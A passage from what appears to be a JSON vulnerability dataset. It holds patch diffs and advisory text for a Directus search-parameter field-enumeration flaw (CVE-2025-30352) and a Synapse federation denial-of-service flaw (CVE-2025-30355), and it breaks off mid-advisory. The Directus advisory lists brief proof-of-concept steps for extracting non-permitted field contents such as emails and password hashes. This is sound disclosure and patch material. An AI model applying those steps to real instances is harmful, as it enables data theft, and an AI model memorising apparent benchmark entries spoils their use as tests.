\t\t\texpect(db['andWhere']).toBeCalledTimes(1);\n-\t\t\texpect(db['orWhere']).toBeCalledTimes(0);\n-\t\t\texpect(db['orWhereRaw']).toBeCalledTimes(1);\n-\t\t\texpect(db['orWhereRaw']).toBeCalledWith('LOWER(??) LIKE ?', ['test.text', `%${number.toLowerCase()}%`]);\n+\t\t\texpect(queryBuilder['orWhere']).toBeCalledTimes(1);\n+\t\t\texpect(queryBuilder['orWhereRaw']).toBeCalledTimes(0);\n+\t\t\texpect(queryBuilder['and']['whereRaw']).toBeCalledTimes(1);\n+\n+\t\t\texpect(queryBuilder['and']['whereRaw']).toBeCalledWith('LOWER(??) LIKE ?', [\n+\t\t\t\t'test.text',\n+\t\t\t\t`%${number.toLowerCase()}%`,\n+\t\t\t]);\n \t\t},\n \t);\n \n \ttest.each(['1234', '-128', '12.34'])('Casting number %s', async (number) => {\n \t\tconst db = mockDatabase();\n+\t\tconst queryBuilder = db as any;\n+\n+\t\tdb['andWhere'].mockImplementation((callback: (queryBuilder: Knex.QueryBuilder) => void) => {\n+\t\t\tcallback(queryBuilder);\n+\t\t\treturn queryBuilder;\n+\t\t});\n \n-\t\tdb['andWhere'].mockImplementation((callback: () => void) => {\n-\t\t\t// detonate the andWhere function\n-\t\t\tcallback.call(db);\n-\t\t\treturn db;\n+\t\tqueryBuilder['orWhere'].mockImplementation((callback: (queryBuilder: Knex.QueryBuilder) => void) => {\n+\t\t\tcallback(queryBuilder);\n+\t\t\treturn queryBuilder;\n \t\t});\n \n-\t\tapplySearch(db as any, FAKE_SCHEMA, db as any, number, 'test');\n+\t\tapplySearch(db as any, FAKE_SCHEMA, queryBuilder, number, 'test', {}, permissions);\n \n \t\texpect(db['andWhere']).toBeCalledTimes(1);\n-\t\texpect(db['orWhere']).toBeCalledTimes(2);\n-\t\texpect(db['orWhereRaw']).toBeCalledTimes(1);\n-\t\texpect(db['orWhereRaw']).toBeCalledWith('LOWER(??) LIKE ?', ['test.text', `%${number.toLowerCase()}%`]);\n+\t\texpect(queryBuilder['orWhere']).toBeCalledTimes(3);\n+\t\texpect(queryBuilder['orWhereRaw']).toBeCalledTimes(0);\n+\t\texpect(queryBuilder['and']['whereRaw']).toBeCalledTimes(1);\n+\n+\t\texpect(queryBuilder['and']['whereRaw']).toBeCalledWith('LOWER(??) LIKE ?', [\n+\t\t\t'test.text',\n+\t\t\t`%${number.toLowerCase()}%`,\n+\t\t]);\n \t});\n \n \ttest('Query is falsy if no other clause is added', async () => {\n \t\tconst db = mockDatabase();\n+\t\tconst queryBuilder = db as any;\n \n \t\tconst schemaWithStringFieldRemoved = JSON.parse(JSON.stringify(FAKE_SCHEMA));\n \n \t\tdelete schemaWithStringFieldRemoved.collections.test.fields.text;\n \n-\t\tdb['andWhere'].mockImplementation((callback: () => void) => {\n-\t\t\t// detonate the andWhere function\n-\t\t\tcallback.call(db);\n-\t\t\treturn db;\n+\t\tdb['andWhere'].mockImplementation((callback: (queryBuilder: Knex.QueryBuilder) => void) => {\n+\t\t\tcallback(queryBuilder);\n+\t\t\treturn queryBuilder;\n+\t\t});\n+\n+\t\tqueryBuilder['orWhere'].mockImplementation((callback: (queryBuilder: Knex.QueryBuilder) => void) => {\n+\t\t\tcallback(queryBuilder);\n+\t\t\treturn queryBuilder;\n+\t\t});\n+\n+\t\tapplySearch(db as any, schemaWithStringFieldRemoved, queryBuilder, 'searchstring', 'test', {}, permissions);\n+\n+\t\texpect(db['andWhere']).toBeCalledTimes(1);\n+\t\texpect(queryBuilder['orWhere']).toBeCalledTimes(0);\n+\t\texpect(queryBuilder['orWhereRaw']).toBeCalledTimes(1);\n+\t\texpect(queryBuilder['orWhereRaw']).toBeCalledWith('1 = 0');\n+\t});\n+\n+\ttest('Remove forbidden field \"text\" from search', () => {\n+\t\tconst db = mockDatabase();\n+\t\tconst queryBuilder = db as any;\n+\n+\t\tdb['andWhere'].mockImplementation((callback: (queryBuilder: Knex.QueryBuilder) => void) => {\n+\t\t\tcallback(queryBuilder);\n+\t\t\treturn queryBuilder;\n+\t\t});\n+\n+\t\tqueryBuilder['orWhere'].mockImplementation((callback: (queryBuilder: Knex.QueryBuilder) => void) => {\n+\t\t\tcallback(queryBuilder);\n+\t\t\treturn queryBuilder;\n+\t\t});\n+\n+\t\tapplySearch(db as any, FAKE_SCHEMA, queryBuilder, 'directus', 'test', {}, [\n+\t\t\t{\n+\t\t\t\tcollection: 'test',\n+\t\t\t\taction: 'read',\n+\t\t\t\tfields: ['text1'],\n+\t\t\t\tpermissions: {\n+\t\t\t\t\ttext: {},\n+\t\t\t\t},\n+\t\t\t} as unknown as Permission,\n+\t\t]);\n+\n+\t\texpect(db['andWhere']).toBeCalledTimes(1);\n+\t\texpect(queryBuilder['orWhere']).toBeCalledTimes(1);\n+\t\texpect(queryBuilder['orWhereRaw']).toBeCalledTimes(0);\n+\t\texpect(queryBuilder['and']['whereRaw']).toBeCalledTimes(1);\n+\t\texpect(queryBuilder['and']['whereRaw']).toBeCalledWith('LOWER(??) LIKE ?', ['test.text1', `%directus%`]);\n+\t});\n+\n+\ttest('Add all fields for * field rule and no item rule', () => {\n+\t\tconst db = mockDatabase();\n+\t\tconst queryBuilder = db as any;\n+\n+\t\tdb['andWhere'].mockImplementation((callback: (queryBuilder: Knex.QueryBuilder) => void) => {\n+\t\t\tcallback(queryBuilder);\n+\t\t\treturn queryBuilder;\n+\t\t});\n+\n+\t\tqueryBuilder['orWhere'].mockImplementation((callback: (queryBuilder: Knex.QueryBuilder) => void) => {\n+\t\t\tcallback(queryBuilder);\n+\t\t\treturn queryBuilder;\n+\t\t});\n+\n+\t\tapplySearch(db as any, FAKE_SCHEMA, queryBuilder, `1`, 'test', {}, [\n+\t\t\t{\n+\t\t\t\tcollection: 'test',\n+\t\t\t\taction: 'read',\n+\t\t\t\tfields: ['*'],\n+\t\t\t\tpermissions: null,\n+\t\t\t} as unknown as Permission,\n+\t\t]);\n+\n+\t\texpect(db['andWhere']).toBeCalledTimes(1);\n+\t\texpect(queryBuilder['orWhere']).toBeCalledTimes(0);\n+\t\texpect(queryBuilder['orWhereRaw']).toBeCalledTimes(0);\n+\t\texpect(queryBuilder['or']['whereRaw']).toBeCalledTimes(2);\n+\t\texpect(queryBuilder['or']['where']).toBeCalledTimes(2);\n+\t});\n+\n+\ttest('Add all fields for * field rule and item rules', () => {\n+\t\tconst db = mockDatabase();\n+\t\tconst queryBuilder = db as any;\n+\n+\t\tdb['andWhere'].mockImplementation((callback: (queryBuilder: Knex.QueryBuilder) => void) => {\n+\t\t\tcallback(queryBuilder);\n+\t\t\treturn queryBuilder;\n+\t\t});\n+\n+\t\tqueryBuilder['orWhere'].mockImplementation((callback: (queryBuilder: Knex.QueryBuilder) => void) => {\n+\t\t\tcallback(queryBuilder);\n+\t\t\treturn queryBuilder;\n+\t\t});\n+\n+\t\tapplySearch(db as any, FAKE_SCHEMA, queryBuilder, '1', 'test', {}, [\n+\t\t\t{\n+\t\t\t\tcollection: 'test',\n+\t\t\t\taction: 'read',\n+\t\t\t\tfields: ['*'],\n+\t\t\t\tpermissions: {\n+\t\t\t\t\ttext: {},\n+\t\t\t\t},\n+\t\t\t} as unknown as Permission,\n+\t\t]);\n+\n+\t\texpect(db['andWhere']).toBeCalledTimes(1);\n+\t\texpect(queryBuilder['orWhere']).toBeCalledTimes(0);\n+\t\texpect(queryBuilder['orWhereRaw']).toBeCalledTimes(0);\n+\t\texpect(queryBuilder['or']['whereRaw']).toBeCalledTimes(2);\n+\t\texpect(queryBuilder['or']['where']).toBeCalledTimes(2);\n+\t});\n+\n+\ttest('Add all fields when at least one policy contains a * field rule', () => {\n+\t\tconst db = mockDatabase();\n+\t\tconst queryBuilder = db as any;\n+\n+\t\tdb['andWhere'].mockImplementation((callback: (queryBuilder: Knex.QueryBuilder) => void) => {\n+\t\t\tcallback(queryBuilder);\n+\t\t\treturn queryBuilder;\n+\t\t});\n+\n+\t\tqueryBuilder['orWhere'].mockImplementation((callback: (queryBuilder: Knex.QueryBuilder) => void) => {\n+\t\t\tcallback(queryBuilder);\n+\t\t\treturn queryBuilder;\n+\t\t});\n+\n+\t\tapplySearch(db as any, FAKE_SCHEMA, queryBuilder, '1', 'test', {}, [\n+\t\t\t{\n+\t\t\t\tcollection: 'test',\n+\t\t\t\taction: 'read',\n+\t\t\t\tfields: ['text'],\n+\t\t\t\tpermissions: {\n+\t\t\t\t\ttext: {},\n+\t\t\t\t},\n+\t\t\t} as unknown as Permission,\n+\t\t\t{\n+\t\t\t\tcollection: 'test',\n+\t\t\t\taction: 'read',\n+\t\t\t\tfields: ['*'],\n+\t\t\t\tpermissions: {\n+\t\t\t\t\ttext: {},\n+\t\t\t\t},\n+\t\t\t} as unknown as Permission,\n+\t\t]);\n+\n+\t\texpect(db['andWhere']).toBeCalledTimes(1);\n+\t\texpect(queryBuilder['orWhere']).toBeCalledTimes(1);\n+\t\texpect(queryBuilder['orWhereRaw']).toBeCalledTimes(0);\n+\t\texpect(queryBuilder['or']['whereRaw']).toBeCalledTimes(2);\n+\t\texpect(queryBuilder['or']['where']).toBeCalledTimes(3);\n+\t});\n+\n+\ttest('Add field(s) without permissions for admin', () => {\n+\t\tconst db = mockDatabase();\n+\t\tconst queryBuilder = db as any;\n+\n+\t\tdb['andWhere'].mockImplementation((callback: (queryBuilder: Knex.QueryBuilder) => void) => {\n+\t\t\tcallback(queryBuilder);\n+\t\t\treturn queryBuilder;\n+\t\t});\n+\n+\t\tqueryBuilder['orWhere'].mockImplementation((callback: (queryBuilder: Knex.QueryBuilder) => void) => {\n+\t\t\tcallback(queryBuilder);\n+\t\t\treturn queryBuilder;\n \t\t});\n \n-\t\tapplySearch(db as any, schemaWithStringFieldRemoved, db as any, 'searchstring', 'test');\n+\t\tapplySearch(db as any, FAKE_SCHEMA, queryBuilder, '1', 'test', {}, []);\n \n \t\texpect(db['andWhere']).toBeCalledTimes(1);\n-\t\texpect(db['orWhere']).toBeCalledTimes(0);\n-\t\texpect(db['orWhereRaw']).toBeCalledTimes(1);\n-\t\texpect(db['orWhereRaw']).toBeCalledWith('1 = 0');\n+\t\texpect(queryBuilder['orWhere']).toBeCalledTimes(0);\n+\t\texpect(queryBuilder['orWhereRaw']).toBeCalledTimes(0);\n+\t\texpect(queryBuilder['or']['whereRaw']).toBeCalledTimes(2);\n \t});\n });\n\n@@ -198,7 +411,7 @@\ndescribe('applyFilter', () => {\n \t\t\t\t\t\t_and: [{ [field]: { [`_${filterOperator}`]: filterValue } }],\n \t\t\t\t\t};\n \n-\t\t\t\t\tconst { query } = applyFilter(db, FAKE_SCHEMA, queryBuilder, rootFilter, collection, {}, []);\n+\t\t\t\t\tconst { query } = applyFilter(db, FAKE_SCHEMA, queryBuilder, rootFilter, collection, {}, [], []);\n \n \t\t\t\t\tconst tracker = createTracker(db);\n \t\t\t\t\ttracker.on.select('*').response([]);\n\n@@ -264,7 +477,7 @@\ndescribe('applyFilter', () => {\n \t\t\t},\n \t\t};\n \n-\t\tconst { query } = applyFilter(db, BIGINT_FAKE_SCHEMA, queryBuilder, rootFilter, collection, {}, []);\n+\t\tconst { query } = applyFilter(db, BIGINT_FAKE_SCHEMA, queryBuilder, rootFilter, collection, {}, [], []);\n \n \t\tconst tracker = createTracker(db);\n \t\ttracker.on.select('*').response([]);\n\n@@ -324,7 +537,7 @@\ndescribe('applyFilter', () => {\n \t\t\t},\n \t\t};\n \n-\t\tconst { query } = applyFilter(db, sampleSchema, queryBuilder, rootFilter, collection, {});\n+\t\tconst { query } = applyFilter(db, sampleSchema, queryBuilder, rootFilter, collection, {}, [], []);\n \n \t\tconst tracker = createTracker(db);\n \t\ttracker.on.select('*').response([]);\n```\n\nFilename: api/src/utils/apply-query.ts:\n```\n@@ -72,10 +72,6 @@\nexport default function applyQuery(\n \t\t}\n \t}\n \n-\tif (query.search) {\n-\t\tapplySearch(knex, schema, dbQuery, query.search, collection);\n-\t}\n-\n \t// `cases` are the permissions cases that are required for the current data set. We're\n \t// dynamically adding those into the filters that the user provided to enforce the permission\n \t// rules. You should be able to read an item if one or more of the cases matches. The actual case\n\n@@ -137,6 +133,10 @@\nexport default function applyQuery(\n \t\tdbQuery.groupBy(columns);\n \t}\n \n+\tif (query.search) {\n+\t\tapplySearch(knex, schema, dbQuery, query.search, collection, aliasMap, permissions);\n+\t}\n+\n \tif (query.aggregate) {\n \t\tapplyAggregate(schema, dbQuery, query.aggregate, collection, hasJoins);\n \t}\n\n@@ -923,38 +923,94 @@\nexport function applySearch(\n \tdbQuery: Knex.QueryBuilder,\n \tsearchQuery: string,\n \tcollection: string,\n+\taliasMap: AliasMap,\n+\tpermissions: Permission[],\n ) {\n \tconst { number: numberHelper } = getHelpers(knex);\n-\tconst fields = Object.entries(schema.collections[collection]!.fields);\n \n-\tdbQuery.andWhere(function () {\n+\tconst allowedFields = new Set(permissions.filter((p) => p.collection === collection).flatMap((p) => p.fields ?? []));\n+\n+\tlet fields = Object.entries(schema.collections[collection]!.fields);\n+\n+\tconst { cases, caseMap } = getCases(collection, permissions, []);\n+\n+\t// Add field restrictions if non-admin and \"everything\" is not allowed\n+\tif (cases.length !== 0 && !allowedFields.has('*')) {\n+\t\tfields = fields.filter((field) => allowedFields.has(field[0]));\n+\t}\n+\n+\tdbQuery.andWhere(function (queryBuilder) {\n \t\tlet needsFallbackCondition = true;\n \n \t\tfields.forEach(([name, field]) => {\n-\t\t\tif (['text', 'string'].includes(field.type)) {\n-\t\t\t\tthis.orWhereRaw(`LOWER(??) LIKE ?`, [`${collection}.${name}`, `%${searchQuery.toLowerCase()}%`]);\n-\t\t\t\tneedsFallbackCondition = false;\n-\t\t\t} else if (isNumericField(field)) {\n-\t\t\t\tconst number = parseNumericString(searchQuery);\n+\t\t\tconst whenCases = (caseMap[name] ?? []).map((caseIndex) => cases[caseIndex]!);\n \n-\t\t\t\tif (number === null) {\n-\t\t\t\t\treturn; // unable to parse\n-\t\t\t\t}\n+\t\t\tconst fieldType = getFieldType(field);\n \n-\t\t\t\tif (numberHelper.isNumberValid(number, field)) {\n-\t\t\t\t\tnumberHelper.addSearchCondition(this, collection, name, number);\n-\t\t\t\t\tneedsFallbackCondition = false;\n-\t\t\t\t}\n-\t\t\t} else if (field.type === 'uuid' && isValidUuid(searchQuery)) {\n-\t\t\t\tthis.orWhere({ [`${collection}.${name}`]: searchQuery });\n+\t\t\tif (fieldType !== null) {\n \t\t\t\tneedsFallbackCondition = false;\n+\t\t\t} else {\n+\t\t\t\treturn;\n+\t\t\t}\n+\n+\t\t\tif (cases.length !== 0 && whenCases?.length !== 0) {\n+\t\t\t\tqueryBuilder.orWhere((subQuery) => {\n+\t\t\t\t\taddSearchCondition(subQuery, name, fieldType, 'and');\n+\n+\t\t\t\t\tapplyFilter(knex, schema, subQuery, { _or: whenCases }, collection, aliasMap, cases, permissions);\n+\t\t\t\t});\n+\t\t\t} else {\n+\t\t\t\taddSearchCondition(queryBuilder, name, fieldType, 'or');\n \t\t\t}\n \t\t});\n \n \t\tif (needsFallbackCondition) {\n-\t\t\tthis.orWhereRaw('1 = 0');\n+\t\t\tqueryBuilder.orWhereRaw('1 = 0');\n \t\t}\n \t});\n+\n+\tfunction addSearchCondition(\n+\t\tqueryBuilder: Knex.QueryBuilder,\n+\t\tname: string,\n+\t\tfieldType: 'string' | 'numeric' | 'uuid',\n+\t\tlogical: 'and' | 'or',\n+\t) {\n+\t\tif (fieldType === null) {\n+\t\t\treturn;\n+\t\t}\n+\n+\t\tif (fieldType === 'string') {\n+\t\t\tqueryBuilder[logical].whereRaw(`LOWER(??) LIKE ?`, [`${collection}.${name}`, `%${searchQuery.toLowerCase()}%`]);\n+\t\t} else if (fieldType === 'numeric') {\n+\t\t\tnumberHelper.addSearchCondition(queryBuilder, collection, name, parseNumericString(searchQuery)!, logical);\n+\t\t} else if (fieldType === 'uuid') {\n+\t\t\tqueryBuilder[logical].where({ [`${collection}.${name}`]: searchQuery });\n+\t\t}\n+\t}\n+\n+\tfunction getFieldType(field: FieldOverview): null | 'string' | 'numeric' | 'uuid' {\n+\t\tif (['text', 'string'].includes(field.type)) {\n+\t\t\treturn 'string';\n+\t\t}\n+\n+\t\tif (isNumericField(field)) {\n+\t\t\tconst number = parseNumericString(searchQuery);\n+\n+\t\t\tif (number === null) {\n+\t\t\t\treturn null;\n+\t\t\t}\n+\n+\t\t\tif (numberHelper.isNumberValid(number, field)) {\n+\t\t\t\treturn 'numeric';\n+\t\t\t}\n+\t\t}\n+\n+\t\tif (field.type === 'uuid' && isValidUuid(searchQuery)) {\n+\t\t\treturn 'uuid';\n+\t\t}\n+\n+\t\treturn null;\n+\t}\n }\n \n export function applyAggregate(\n```",
                "url": "https://github.com/directus/directus/commit/ac5a9964d9926f20dc063a74cb417dc7bbad676d"
            }
        ],
        "published_date": "2025-03-26T17:18:39.567Z",
        "sec_adv": [
            {
                "content": "Skip to content\nNavigation Menu\nProduct\nSolutions\nResources\nOpen Source\nEnterprise\nPricing\nSearch or jump to...\nSign in\nSign up\nAppearance settings\nDismiss alert\ndirectus\n/\ndirectus\nPublic\nSponsor\nNotifications You must be signed in to change notification settings\nFork 4.2k\nStar 30.5k\nCode\nIssues\n305\nPull requests\n37\nDiscussions\nActions\nProjects\nSecurity\n35\nInsights\nAdditional navigation options\n`search` query parameter allows enumeration of non permitted fields\nModerate br41nslug published GHSA-7wq3-jr35-275c on Mar 26Mar 26, 2025\nPackage\nnpm directus\n(\nnpm\n)\nAffected versions\n>=9.0.0-alpha.4\nPatched versions\n11.5.0\nDescription\nSummary\nThe search query parameter allows users with access to a collection to filter items based on fields they do not have permission to view. This allows the enumeration of unknown field contents.\nDetails\nThe searchable columns (numbers & strings) are not checked against permissions when injecting the where clauses for applying the search query. This leads to the possibility of enumerating those un-permitted fields.\nPoC\nCreate a collection with a string / numeric field, configure the permissions for the public role to not include the field created\nCreate items with identifiable content in the not permitted field\nQuery the collection and include the field content in the search parameter\nSee that results are returned, even tho the public user does not have permission to view the field content\nImpact\nThis vulnerability is a very high impact, as for example Directus instances which allow public read access to the user avatar are vulnerable to have the email addresses, password hashes and potentially admin level access tokens extracted. The admin token and password hash extraction have a caveat, as string fields are only searched with a lower cased version of the search query.\nSeverity\nModerate\n5.3\n/ 10\nCVSS v3 base metrics\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nLow\nIntegrity\nNone\nAvailability\nNone\nLearn more about base metrics\nCVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N\nCVE ID\nCVE-2025-30352\nWeaknesses\nCWE-200\nCredits\nhanneskuettner\nReporter\nmoritzgvt\nReporter\nFooter\n\u00a9 2025 GitHub, Inc.\nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\nManage cookies\nDo not share my personal information",
                "effective": true,
                "effective_reason": "The advisory includes specific steps to reproduce the issue, described under the section labeled 'PoC.'",
                "url": "https://github.com/directus/directus/security/advisories/GHSA-7wq3-jr35-275c"
            }
        ],
        "sw_version": "v9.0.0-alpha.4",
        "sw_version_wget": "https://github.com/directus/directus/archive/refs/tags/v9.0.0-alpha.4.zip"
    },
    "CVE-2025-30355": {
        "cwe": [
            {
                "id": "CWE-20",
                "value": "CWE-20: Improper Input Validation"
            }
        ],
        "description": "Synapse is an open source Matrix homeserver implementation. A malicious server can craft events which, when received, prevent Synapse version up to 1.127.0 from federating with other servers. The vulnerability has been exploited in the wild and has been fixed in Synapse v1.127.1. No known workarounds are available.",
        "languages": [
            "Python"
        ],
        "patch_commits": [
            {
                "content": "Fix GHSA-v56r-hwv5-mxg6 \u2014 Federation denial\n\nFixes https://github.com/element-hq/synapse/security/advisories/GHSA-v56r-hwv5-mxg6\n\nFederation denial of service via malformed events.\n\nFilename: synapse/api/constants.py:\n```\n@@ -29,8 +29,13 @@\n# the max size of a (canonical-json-encoded) event\n MAX_PDU_SIZE = 65536\n \n-# the \"depth\" field on events is limited to 2**63 - 1\n-MAX_DEPTH = 2**63 - 1\n+# Max/min size of ints in canonical JSON\n+CANONICALJSON_MAX_INT = (2**53) - 1\n+CANONICALJSON_MIN_INT = -CANONICALJSON_MAX_INT\n+\n+# the \"depth\" field on events is limited to the same as what\n+# canonicaljson accepts\n+MAX_DEPTH = CANONICALJSON_MAX_INT\n \n # the maximum length for a room alias is 255 characters\n MAX_ALIAS_LENGTH = 255\n```\n\nFilename: synapse/events/utils.py:\n```\n@@ -40,6 +40,8 @@\nfrom canonicaljson import encode_canonical_json\n \n from synapse.api.constants import (\n+    CANONICALJSON_MAX_INT,\n+    CANONICALJSON_MIN_INT,\n     MAX_PDU_SIZE,\n     EventContentFields,\n     EventTypes,\n\n@@ -61,9 +63,6 @@\n# Find escaped characters, e.g. those with a \\ in front of them.\n ESCAPE_SEQUENCE_PATTERN = re.compile(r\"\\\\(.)\")\n \n-CANONICALJSON_MAX_INT = (2**53) - 1\n-CANONICALJSON_MIN_INT = -CANONICALJSON_MAX_INT\n-\n \n # Module API callback that allows adding fields to the unsigned section of\n # events that are sent to clients.\n```\n\nFilename: synapse/events/validator.py:\n```\n@@ -86,9 +86,7 @@\ndef validate_new(self, event: EventBase, config: HomeServerConfig) -> None:\n \n         # Depending on the room version, ensure the data is spec compliant JSON.\n         if event.room_version.strict_canonicaljson:\n-            # Note that only the client controlled portion of the event is\n-            # checked, since we trust the portions of the event we created.\n-            validate_canonicaljson(event.content)\n+            validate_canonicaljson(event.get_pdu_json())\n \n         if event.type == EventTypes.Aliases:\n             if \"aliases\" in event.content:\n```\n\nFilename: synapse/federation/federation_base.py:\n```\n@@ -20,7 +20,7 @@\n#\n #\n import logging\n-from typing import TYPE_CHECKING, Awaitable, Callable, Optional\n+from typing import TYPE_CHECKING, Awaitable, Callable, List, Optional, Sequence\n \n from synapse.api.constants import MAX_DEPTH, EventContentFields, EventTypes, Membership\n from synapse.api.errors import Codes, SynapseError\n\n@@ -29,6 +29,7 @@\nfrom synapse.crypto.keyring import Keyring\n from synapse.events import EventBase, make_event_from_dict\n from synapse.events.utils import prune_event, validate_canonicaljson\n+from synapse.federation.units import filter_pdus_for_valid_depth\n from synapse.http.servlet import assert_params_in_dict\n from synapse.logging.opentracing import log_kv, trace\n from synapse.types import JsonDict, get_domain_from_id\n\n@@ -267,6 +268,15 @@\ndef _is_invite_via_3pid(event: EventBase) -> bool:\n     )\n \n \n+def parse_events_from_pdu_json(\n+    pdus_json: Sequence[JsonDict], room_version: RoomVersion\n+) -> List[EventBase]:\n+    return [\n+        event_from_pdu_json(pdu_json, room_version)\n+        for pdu_json in filter_pdus_for_valid_depth(pdus_json)\n+    ]\n+\n+\n def event_from_pdu_json(pdu_json: JsonDict, room_version: RoomVersion) -> EventBase:\n     \"\"\"Construct an EventBase from an event json received over federation\n```\n\nFilename: synapse/federation/federation_client.py:\n```\n@@ -68,6 +68,7 @@\nFederationBase,\n     InvalidEventSignatureError,\n     event_from_pdu_json,\n+    parse_events_from_pdu_json,\n )\n from synapse.federation.transport.client import SendJoinResponse\n from synapse.http.client import is_unknown_endpoint\n\n@@ -349,7 +350,7 @@\nasync def backfill(\n \n         room_version = await self.store.get_room_version(room_id)\n \n-        pdus = [event_from_pdu_json(p, room_version) for p in transaction_data_pdus]\n+        pdus = parse_events_from_pdu_json(transaction_data_pdus, room_version)\n \n         # Check signatures and hash of pdus, removing any from the list that fail checks\n         pdus[:] = await self._check_sigs_and_hash_for_pulled_events_and_fetch(\n\n@@ -393,9 +394,7 @@\nasync def get_pdu_from_destination_raw(\n             transaction_data,\n         )\n \n-        pdu_list: List[EventBase] = [\n-            event_from_pdu_json(p, room_version) for p in transaction_data[\"pdus\"]\n-        ]\n+        pdu_list = parse_events_from_pdu_json(transaction_data[\"pdus\"], room_version)\n \n         if pdu_list and pdu_list[0]:\n             pdu = pdu_list[0]\n\n@@ -809,7 +808,7 @@\nasync def get_event_auth(\n \n         room_version = await self.store.get_room_version(room_id)\n \n-        auth_chain = [event_from_pdu_json(p, room_version) for p in res[\"auth_chain\"]]\n+        auth_chain = parse_events_from_pdu_json(res[\"auth_chain\"], room_version)\n \n         signed_auth = await self._check_sigs_and_hash_for_pulled_events_and_fetch(\n             destination, auth_chain, room_version=room_version\n\n@@ -1529,9 +1528,7 @@\nasync def get_missing_events(\n \n             room_version = await self.store.get_room_version(room_id)\n \n-            events = [\n-                event_from_pdu_json(e, room_version) for e in content.get(\"events\", [])\n-            ]\n+            events = parse_events_from_pdu_json(content.get(\"events\", []), room_version)\n \n             signed_events = await self._check_sigs_and_hash_for_pulled_events_and_fetch(\n                 destination, events, room_version=room_version\n```\n\nFilename: synapse/federation/federation_server.py:\n```\n@@ -66,7 +66,7 @@\nevent_from_pdu_json,\n )\n from synapse.federation.persistence import TransactionActions\n-from synapse.federation.units import Edu, Transaction\n+from synapse.federation.units import Edu, Transaction, serialize_and_filter_pdus\n from synapse.handlers.worker_lock import NEW_EVENT_DURING_PURGE_LOCK_NAME\n from synapse.http.servlet import assert_params_in_dict\n from synapse.logging.context import (\n\n@@ -469,7 +469,12 @@\nasync def _handle_pdus_in_txn(\n                 logger.info(\"Ignoring PDU: %s\", e)\n                 continue\n \n-            event = event_from_pdu_json(p, room_version)\n+            try:\n+                event = event_from_pdu_json(p, room_version)\n+            except SynapseError as e:\n+                logger.info(\"Ignoring PDU for failing to deserialize: %s\", e)\n+                continue\n+\n             pdus_by_room.setdefault(room_id, []).append(event)\n \n             if event.origin_server_ts > newest_pdu_ts:\n\n@@ -636,8 +641,8 @@\nasync def _on_context_state_request_compute(\n         )\n \n         return {\n-            \"pdus\": [pdu.get_pdu_json() for pdu in pdus],\n-            \"auth_chain\": [pdu.get_pdu_json() for pdu in auth_chain],\n+            \"pdus\": serialize_and_filter_pdus(pdus),\n+            \"auth_chain\": serialize_and_filter_pdus(auth_chain),\n         }\n \n     async def on_pdu_request(\n\n@@ -761,8 +766,8 @@\nasync def on_send_join_request(\n         event_json = event.get_pdu_json(time_now)\n         resp = {\n             \"event\": event_json,\n-            \"state\": [p.get_pdu_json(time_now) for p in state_events],\n-            \"auth_chain\": [p.get_pdu_json(time_now) for p in auth_chain_events],\n+            \"state\": serialize_and_filter_pdus(state_events, time_now),\n+            \"auth_chain\": serialize_and_filter_pdus(auth_chain_events, time_now),\n             \"members_omitted\": caller_supports_partial_state,\n         }\n\n@@ -1005,7 +1010,7 @@\nasync def on_event_auth(\n \n             time_now = self._clock.time_msec()\n             auth_pdus = await self.handler.on_event_auth(event_id)\n-            res = {\"auth_chain\": [a.get_pdu_json(time_now) for a in auth_pdus]}\n+            res = {\"auth_chain\": serialize_and_filter_pdus(auth_pdus, time_now)}\n         return 200, res\n \n     async def on_query_client_keys(\n\n@@ -1090,7 +1095,7 @@\nasync def on_get_missing_events(\n \n             time_now = self._clock.time_msec()\n \n-        return {\"events\": [ev.get_pdu_json(time_now) for ev in missing_events]}\n+        return {\"events\": serialize_and_filter_pdus(missing_events, time_now)}\n \n     async def on_openid_userinfo(self, token: str) -> Optional[str]:\n         ts_now_ms = self._clock.time_msec()\n```\n\nFilename: synapse/federation/units.py:\n```\n@@ -24,10 +24,12 @@\n\"\"\"\n \n import logging\n-from typing import List, Optional\n+from typing import List, Optional, Sequence\n \n import attr\n \n+from synapse.api.constants import CANONICALJSON_MAX_INT, CANONICALJSON_MIN_INT\n+from synapse.events import EventBase\n from synapse.types import JsonDict\n \n logger = logging.getLogger(__name__)\n\n@@ -104,8 +106,28 @@\ndef get_dict(self) -> JsonDict:\n         result = {\n             \"origin\": self.origin,\n             \"origin_server_ts\": self.origin_server_ts,\n-            \"pdus\": self.pdus,\n+            \"pdus\": filter_pdus_for_valid_depth(self.pdus),\n         }\n         if self.edus:\n             result[\"edus\"] = self.edus\n         return result\n+\n+\n+def filter_pdus_for_valid_depth(pdus: Sequence[JsonDict]) -> List[JsonDict]:\n+    filtered_pdus = []\n+    for pdu in pdus:\n+        # Drop PDUs that have a depth that is outside of the range allowed\n+        # by canonical json.\n+        if (\n+            \"depth\" in pdu\n+            and CANONICALJSON_MIN_INT <= pdu[\"depth\"] <= CANONICALJSON_MAX_INT\n+        ):\n+            filtered_pdus.append(pdu)\n+\n+    return filtered_pdus\n+\n+\n+def serialize_and_filter_pdus(\n+    pdus: Sequence[EventBase], time_now: Optional[int] = None\n+) -> List[JsonDict]:\n+    return filter_pdus_for_valid_depth([pdu.get_pdu_json(time_now) for pdu in pdus])\n```",
                "url": "https://github.com/element-hq/synapse/commit/2277df2a1eb685f85040ef98fa21d41aa4cdd389"
            }
        ],
        "published_date": "2025-03-27T00:59:27.996Z",
        "sec_adv": [
            {
                "content": "Skip to content\nNavigation Menu\nProduct\nSolutions\nResources\nOpen Source\nEnterprise\nPricing\nSearch or jump to...\nSign in\nSign up\nAppearance settings\nDismiss alert\nelement-hq\n/\nsynapse\nPublic\nNotifications You must be signed in to change notification settings\nFork 321\nStar 2.4k\nCode\nIssues\n1.7k\nPull requests\n88\nActions\nProjects\nSecurity\n8\nInsights\nAdditional navigation options\nFederation denial of service via malformed events\nHigh davidegirardi published GHSA-v56r-hwv5-mxg6 on Mar 26Mar 26, 2025\nPackage\nSynapse\nAffected versions\n<= 1.127.0\nPatched versions\n1.127.1\nDescription\nImpact\nA malicious server can craft events which, when received, prevent Synapse version up to 1.127.0 from federating with other servers. The vulnerability has been exploited in the wild.\nPatches\nFixed in Synapse v1.127.1.\nWorkarounds\nClosed federation environments of trusted servers or non-federating installations are not affected.\nFor more information\nIf you have any questions or comments about this advisory, please email us at security at element.io.\nSeverity\nHigh\n7.1\n/ 10\nCVSS 